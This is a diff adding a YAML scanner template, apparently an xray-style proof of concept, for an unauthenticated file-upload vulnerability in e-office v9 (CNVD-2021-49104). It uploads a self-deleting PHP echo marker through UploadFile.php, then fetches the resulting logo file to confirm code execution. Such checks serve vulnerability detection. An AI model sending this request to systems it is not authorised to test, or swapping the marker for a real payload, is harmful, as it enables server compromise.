@@ -1,0 +1,23 @@
+name: poc-yaml-e-office-v9-upload-cnvd-2021-49104
+manual: true
+transport: http
+set:
+  r1: randomLowercase(8)
+rules:
+  - method: POST
+    path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+    headers:
+    Content-Type: multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4
+    body: "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"{{r1}}\"; unlink(__FILE__); ?>\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n\r\n"
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(b"logo-eoffice")
+  - method: GET
+    path: /images/logo/logo-eoffice.php
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(r1))
+detail:
+  author: we1x4n
+  links:
+    - https://blog.csdn.net/weixin_44309905/article/details/121588557
